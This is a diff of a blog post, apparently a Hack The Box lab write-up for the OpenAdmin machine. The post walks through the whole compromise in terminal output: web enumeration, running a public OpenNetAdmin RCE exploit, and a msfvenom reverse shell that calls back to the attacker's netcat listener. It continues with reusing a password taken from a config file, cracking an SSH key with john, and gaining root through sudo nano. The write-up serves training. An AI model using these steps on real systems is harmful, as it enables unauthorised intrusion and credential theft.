@@ -26,8 +26,7 @@ Here we are for another one.  We are working on OpenAdmin this time.
 
 Give nmap a run to try identify services.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.171
 [sudo] password for kali: 
@@ -58,14 +57,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.12 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run curl -I against port 80 to pull the headers to try to identify some technologies.
 
-{% raw %}
-```bash
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ curl -I http://10.10.10.171    
 HTTP/1.1 200 OK
@@ -77,14 +75,13 @@ Accept-Ranges: bytes
 Content-Length: 10918
 Vary: Accept-Encoding
 Content-Type: text/html
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Ffuf the webserver to discover directories and files.
 
-{% raw %}
-```bash
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.171/FUZZ -e txt,bak,pdf,xml -fs 10918
 
@@ -115,8 +112,8 @@ artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration:
 sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 13ms]
 server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 12ms]
 :: Progress: [1102795/1102795] :: Job [1/1] :: 3636 req/sec :: Duration: [0:06:15] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -130,10 +127,7 @@ Check the landing page the webserver is serving.
 <br />
 Check the source code for the landing page looking for something juicy.
 
-{% raw %}
-```html
-view-source:http://10.10.10.171/music/
-
+{% capture landingsource %}
 <!DOCTYPE html>
 <html lang="zxx">
 <head>
@@ -162,8 +156,8 @@ view-source:http://10.10.10.171/music/
 
 	</body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.10.171/music/' content=landingsource %}
 
 <br />
 Check the ../ona directory that was listed in the music page.  Notice the version.
@@ -186,8 +180,7 @@ Search the version on the GitHub looking for an exploit.
 <br />
 Download the python exploit that we found.
 
-{% raw %}
-```bash
+{% capture downloadonarce %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ wget https://raw.githubusercontent.com/amriunix/ona-rce/refs/heads/master/ona-rce.py
 --2025-01-27 14:32:51--  https://raw.githubusercontent.com/amriunix/ona-rce/refs/heads/master/ona-rce.py
@@ -200,28 +193,26 @@ Saving to: ‘ona-rce.py’
 ona-rce.py                                                 100%[========================================================================================================================================>]   2.39K  --.-KB/s    in 0s      
 
 2025-01-27 14:32:52 (70.2 MB/s) - ‘ona-rce.py’ saved [2443/2443]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadonarce %}
 
 <br />
 Run the exploit and get a shell.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ python3 ona-rce.py exploit http://10.10.10.171/ona
 [*] OpenNetAdmin 18.1.1 - Remote Code Execution
 [+] Connecting !
 [+] Connected Successfully!
 sh$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Generate a msfvenom elf file that creates a reverse tcp shell.
 
-{% raw %}
-```bash
+{% capture genelf %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f elf -o shell           
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -234,25 +225,23 @@ Saved as: shell
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ python -m 'http.server'                            
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genelf %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start4444listener %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ nc -nlvp 4444    
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start4444listener %}
 
 <br />
 Transfer the binary to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferelf %}
 sh$ wget http://10.10.16.12:8000/shell
 --2025-01-27 03:38:19--  http://10.10.16.12:8000/shell
 Connecting to 10.10.16.12:8000... connected.
@@ -263,37 +252,34 @@ Saving to: 'shell'
      0K                                                       100% 28.5M=0s
 
 2025-01-27 03:38:19 (28.5 MB/s) - 'shell' saved [194/194]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferelf %}
 
 <br />
 Execute the payload.
 
-{% raw %}
-```bash
+{% capture runelf %}
 sh$ ./shell
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runelf %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchelfshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ nc -nlvp 4444    
 listening on [any] 4444 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.171] 48658
 python3 -c 'import pty; pty.spawn("/bin/bash");'
 www-data@openadmin:/opt/ona/www$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchelfshell %}
 
 <br />
 Check the /var/www folder.  Notice the internal folder and get permission denied.
 
-{% raw %}
-```bash
+{% capture lsinternal %}
 www-data@openadmin:/opt/ona/www$ cd /var/www
 cd /var/www
 www-data@openadmin:/var/www$ ls
@@ -302,14 +288,13 @@ html  internal  ona
 www-data@openadmin:/var/www$ cd internal
 cd internal
 bash: cd: internal: Permission denied
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=lsinternal %}
 
 <br />
 Get a list of the services that are listening.
 
-{% raw %}
-```bash
+{% capture listservices %}
 www-data@openadmin:/var/www$ netstat -antup
 netstat -antup
 (Not all processes could be identified, non-owned process info
@@ -328,14 +313,13 @@ tcp6       0      0 10.10.10.171:80         10.10.16.12:53936       ESTABLISHED 
 udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
 udp        0      0 127.0.0.1:35534         127.0.0.53:53           ESTABLISHED -                   
 udp        0      0 10.10.10.171:34605      1.1.1.1:53              ESTABLISHED -
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=listservices %}
 
 <br />
 Check the 52846 port and see what it is serving.
 
-{% raw %}
-```bash
+{% capture wgetindex %}
 www-data@openadmin:/var/www$ cd /dev/shm
 cd /dev/shm
 www-data@openadmin:/dev/shm$ wget 127.0.0.1:52846
@@ -353,14 +337,13 @@ index.html          100%[===================>]   2.46K  --.-KB/s    in 0s
 www-data@openadmin:/dev/shm$ ls
 ls
 index.html
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=wgetindex %}
 
 <br />
 Cat the index.html file that we just downloaded.  Looks like some kind of login page.
 
-{% raw %}
-```html
+{% capture indexhtml %}
 <?
    // error_reporting(E_ALL);
    // ini_set("display_errors", 1);
@@ -400,16 +383,18 @@ Cat the index.html file that we just downloaded.  Looks like some kind of login 
 
    </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='index.html' content=indexhtml %}
 
 <br />
 Check the sites-available.
 
-{% raw %}
-```bash
+{% capture catinternalconf %}
 www-data@openadmin:/etc/apache2/sites-available$ cat internal.conf 
 cat internal.conf
+{% endcapture %}
+
+{% capture internalconf %}
 Listen 127.0.0.1:52846
 
 <VirtualHost 127.0.0.1:52846>
@@ -424,61 +409,68 @@ AssignUserID joanna joanna
     CustomLog ${APACHE_LOG_DIR}/access.log combined
 
 </VirtualHost>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catinternalconf %}
+
+{% include codebox.html title="internal.conf" content=internalconf %}
 
 <br />
 Run id to see what user we are.
 
-{% raw %}
-```bash
+{% capture id %}
 www-data@openadmin:/opt/ona/www$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=id %}
 
 <br />
 Run sudo -l to see if we can run anything as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 www-data@openadmin:/opt/ona/www$ sudo -l
 sudo -l
 sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
 sudo: error initializing audit plugin sudoers_audit
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Run uname -a to get the linux version.
 
-{% raw %}
-```bash
+{% capture unamea %}
 www-data@openadmin:/opt/ona/www$ uname -a
 uname -a
 Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=unamea %}
 
 <br />
 Check the /etc/issues file to id the Ubuntu version.
 
-{% raw %}
-```bash
+{% capture catetcissue %}
 www-data@openadmin:/opt/ona/www$ cat /etc/issue
 cat /etc/issue
+{% endcapture %}
+
+{% capture etcissue %}
 Ubuntu 18.04.3 LTS \n \l
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetcissue %}
+
+{% include codebox.html title="/etc/issue" content=etcissue %}
 
 <br />
 Check the /etc/hosts file.
 
-{% raw %}
-```bash
+{% capture catetcpasswd %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
-└─$ cat /etc/hosts              
+└─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture etcpasswd %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.10.171    openadmin.htb internal.openadmin.htb 
@@ -487,16 +479,21 @@ Check the /etc/hosts file.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetcpasswd %}
+
+{% include codebox.html title="/etc/passwd" content=etcpasswd %}
 
 <br />
 Check the /etc/passwd file to identify the users.
 
-{% raw %}
-```bash
+{% capture catetcpasswd %}
 www-data@openadmin:/opt/ona/www/include$ cat /etc/passwd
 cat /etc/passwd
+{% endcapture %}
+
+{% capture etcpasswd %}
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -529,28 +526,29 @@ sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
 jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
 mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
 joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetcpasswd %}
+
+{% include codebox.html title="/etc/passwd" content=etcpasswd %}
 
 <br />
 Run env to get the environment variables.
 
-{% raw %}
-```bash
+{% capture checkenv %}
 www-data@openadmin:/dev/shm$ env
 env
 PWD=/dev/shm
 SHLVL=1
 _=/usr/bin/env
 OLDPWD=/opt/ona/www/include
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=checkenv %}
 
 <br />
 Check the /opt/ona/www/local/config/database_settings.inc.php file to see for any potential passwords.
 
-{% raw %}
-```php
+{% capture settings %}
 <?php
 
 $ona_contexts=array (
@@ -574,14 +572,13 @@ $ona_contexts=array (
 );
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='database_settings.inc.php' content=settings %}
 
 <br />
 Use the password from the file to ssh into the jimmy account.  Password re-use for the win!
 
-{% raw %}
-```bash
+{% capture sshjimmy %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ ssh jimmy@10.10.10.171                    
 The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
@@ -614,35 +611,32 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 
 Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
 jimmy@openadmin:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshjimmy %}
 
 <br />
 Run sudo -l to see if we can run anything as sudo with jimmy.
 
-{% raw %}
-```bash
+{% capture sudol %}
 jimmy@openadmin:~$ sudo -l
 [sudo] password for jimmy: 
 Sorry, user jimmy may not run sudo on openadmin.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Check the internal folder that we should have permission to now.
 
-{% raw %}
-```bash
+{% capture lsinternal %}
 jimmy@openadmin:/var/www/internal$ ls
 index.php  logout.php  main.php
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=lsinternal %}
 
 <br />
 Curl against the main.php from the internal website.
 
-{% raw %}
-```bash
+{% capture curlinternalmain %}
 jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php
 <pre>-----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -654,33 +648,41 @@ DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
 <h3>Don't forget your "ninja" password</h3>
 Click here to logout <a href="logout.php" tite = "Logout">Session
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curlinternalmain %}
 
 <br />
 Save the id_rsa to a file on the attack machine and chmod it to 600.
 
-{% raw %}
-```bash
+{% capture catidrsa %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
-└─$ cat id_rsa                  
+└─$ cat id_rsa
+{% endcapture %}
+
+{% capture idrsa %}
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
 
 <redacted>
 -----END RSA PRIVATE KEY-----
-                                                                                                                                                                                                                                            
+{% endcapture %}
+
+{% capture chmodidrsa %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ chmod 600 id_rsa
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catidrsa %}
+
+{% include codebox.html title="Config File Example" content=idrsa %}
+
+{% include terminal.html language='bash' title='bash' content=chmodidrsa %}
 
 <br />
 Use john the ripper to crack the id_rsa to get the passphrase.
 
-{% raw %}
-```bash
+{% capture johncrackrsa %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ ssh2john id_rsa > john_id_rsa   
                                                                                                                                                                                                                                             
@@ -696,14 +698,13 @@ bloodninjas      (id_rsa)
 1g 0:00:00:02 DONE (2025-06-09 13:11) 0.4219g/s 4039Kp/s 4039Kc/s 4039KC/s bloodofyouth..bloodmore23
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=johncrackrsa %}
 
 <br />
 Use the id_rsa and passphrase to login to joanna.
 
-{% raw %}
-```bash
+{% capture sshjoanna %}
 ┌──(kali㉿kali)-[~/Documents/htb/openadmin]
 └─$ ssh -i id_rsa joanna@10.10.10.171                           
 Enter passphrase for key 'id_rsa': 
@@ -733,22 +734,21 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
 joanna@openadmin:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshjoanna %}
 
 <br />
 Run sudo -l again for the joanna user.
 
-{% raw %}
-```bash
+{% capture sudol %}
 joanna@openadmin:~$ sudo -l
 Matching Defaults entries for joanna on openadmin:
     env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
 
 User joanna may run the following commands on openadmin:
     (ALL) NOPASSWD: /bin/nano /opt/priv
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Check the nano in GTFOBins.
@@ -763,11 +763,10 @@ Check the nano in GTFOBins.
 <br />
 Sudo into the nano command.
 
-{% raw %}
-```bash
+{% capture sudonano %}
 joanna@openadmin:~$ sudo /bin/nano /opt/priv
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudonano %}
 
 <br />
 Enter the command from GTFOBins and drop into a root shell.
@@ -781,8 +780,7 @@ Enter the command from GTFOBins and drop into a root shell.
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 # cat /home/joanna/user.txt
 <redacted>
 # ip a
@@ -800,14 +798,13 @@ Get the user.txt flag.
        valid_lft 86398sec preferred_lft 14398sec
     inet6 fe80::250:56ff:fe95:1c2f/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt                                                                                                  M-F New Buffer
 <redacted>
 # ip a
@@ -825,8 +822,8 @@ Get the root.txt flag.
        valid_lft 86399sec preferred_lft 14399sec
     inet6 fe80::250:56ff:fe95:1c2f/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 With that flag, we can close the OpenAdmin box.  I appreciate the read so much.  See you in the next box.
